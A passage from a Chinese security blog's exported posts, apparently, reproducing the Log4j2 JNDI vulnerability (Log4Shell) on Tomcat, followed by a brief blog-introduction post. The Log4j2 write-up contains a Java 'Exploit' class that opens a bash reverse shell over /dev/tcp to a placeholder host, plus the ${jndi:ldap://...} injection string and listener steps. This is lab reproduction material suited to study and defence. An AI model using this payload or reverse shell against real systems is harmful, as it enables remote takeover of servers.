&lt;/Loggers&gt;</span><br><span class="line">&lt;/Configuration&gt;</span><br></pre></td></tr></table></figure></div><p>2、log4j2组件引用</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] 将3个 log4j2 jar包 和 tomcat-juli-adapters.jar放到 tomact 目录下的lib文件夹下</span><br><span class="line">[+] tomcat-juli.jar 替换tomcat目录下 bin 文件夹下的同名文件</span><br><span class="line">[+] 删除tomact目录下conf文件夹下的logging.properties文件，并将新建的log4j2.xml，放到tomcat目录下lib文件夹下</span><br></pre></td></tr></table></figure></div><p>3、启动环境</p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>2、手动复现</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x:8080/examples/servlets/servlet/RequestParamExample</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/log4j2/2.png" data-caption="image-20220901133439529"><img src="/../images/log4j2/2.png" alt="image-20220901133439529"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/3.png" data-caption="image-20220901133243059"><img src="/../images/log4j2/3.png" alt="image-20220901133243059"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/4.png" data-caption="image-20220901133342785"><img src="/../images/log4j2/4.png" alt="image-20220901133342785"></a></p><p>反弹shell</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">           <span class="comment">// 要执行的命令</span></span><br><span class="line">           String[] commands = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;</span><br><span class="line">           <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> Runtime.getRuntime().exec(commands);</span><br><span class="line">           pc.waitFor();</span><br><span class="line">      &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">       <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>启动恶意类</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/5.png" data-caption="image-20220901135410419"><img src="/../images/log4j2/5.png" alt="image-20220901135410419"></a></p><p>开启LDAP服务</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/6.png" data-caption="image-20220901140229204"><img src="/../images/log4j2/6.png" alt="image-20220901140229204"></a></p><p>开启nc监听</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/7.png" data-caption="image-20220901140258163"><img src="/../images/log4j2/7.png" alt="image-20220901140258163"></a></p><p>burp放包，执行命令反弹shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://x.x.x.x:1234/Exploit&#125;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/log4j2/8.png" data-caption="image-20220901135944613"><img src="/../images/log4j2/8.png" alt="image-20220901135944613"></a></p><p>获取shell</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/9.png" data-caption="image-20220901140041503"><img src="/../images/log4j2/9.png" alt="image-20220901140041503"></a></p><p>1、Burp插件被动扫描</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://f0ng.github.io/2021/12/22/log4j2burpscanner/</span><br></pre></td></tr></table></figure></div><p>配置自己的ceye.io</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/10.png" data-caption="image-20220901181915587"><img src="/../images/log4j2/10.png" alt="image-20220901181915587"></a></p><p><a data-fancybox="gallery" data-src="/../images/log4j2/11.png" data-caption="image-20220901181949766"><img src="/../images/log4j2/11.png" alt="image-20220901181949766"></a></p><p>随后开启Burp，网站点点点，进行被动扫描</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/12.png" data-caption="image-20220901161415792"><img src="/../images/log4j2/12.png" alt="image-20220901161415792"></a></p><p>ceye.io接收到请求</p><p><a data-fancybox="gallery" data-src="/../images/log4j2/13.png" data-caption="image-20220901161537040"><img src="/../images/log4j2/13.png" alt="image-20220901161537040"></a></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/A0CnPqZO3cP3gWpItxvIbA</span><br><span class="line">https://blog.csdn.net/tutian2000/article/details/81903924</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小站杂货店-缘起</title>
      <link href="/2022/09/01/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E7%BC%98%E8%B5%B7/"/>
      <url>/2022/09/01/%E5%B0%8F%E7%AB%99%E6%9D%82%E8%B4%A7%E5%BA%97-%E7%BC%98%E8%B5%B7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a data-fancybox="gallery" data-src="/../images/private/3.png" data-caption="image-20220901140741054"><img src="/../images/private/3.png" alt="image-20220901140741054"></a></p><h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>近年在学习的时候，虽然也有作笔记的习惯，不时回看，不知所云，建立此博客用于记录学习的过程，当然也会不时分享奇闻趣事，个人感想。</p>]]></content>
      
      
      <categories>
          
          <category> 小站杂记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小站杂记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
